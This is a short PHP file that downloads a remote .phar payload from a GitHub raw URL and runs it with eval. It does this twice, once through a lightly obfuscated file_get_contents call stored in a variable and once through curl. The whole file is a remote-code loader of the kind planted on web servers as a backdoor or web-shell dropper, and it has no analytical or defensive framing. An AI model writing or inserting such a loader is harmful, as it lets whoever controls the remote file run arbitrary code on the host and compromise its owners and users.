<?php
$_AB = "https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/ext.phar";$_B = "FILE_GET_CONTENTS"; eVAL("?>".$_B($_AB));
$url = "https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/ext.phar";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
